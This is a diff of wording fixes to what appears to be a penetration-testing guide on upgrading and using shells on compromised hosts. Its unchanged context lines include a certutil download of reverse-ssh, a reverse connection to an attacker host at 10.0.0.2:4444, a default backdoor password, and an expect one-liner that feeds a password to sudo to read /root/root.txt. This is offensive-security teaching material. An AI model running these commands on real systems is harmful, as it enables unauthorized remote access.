@@ -18,7 +18,7 @@
 
 ## Full TTY
 
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
+Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -86,7 +86,7 @@ certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/d
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 
-* If the ReverseSSH port forwarding request was successful, you should now be able to log in with default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
+* If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
 
 ```bash
 # Interactive shell access
@@ -98,7 +98,7 @@ sftp -P 8888 127.0.0.1
 
 ## No TTY
 
-If for some reason you cannot obtain a full TTY you **still can interact with programs** that expects user input. In the following example, the password is passed to `sudo` to read a file:
+If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, the password is passed to `sudo` to read a file:
 
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
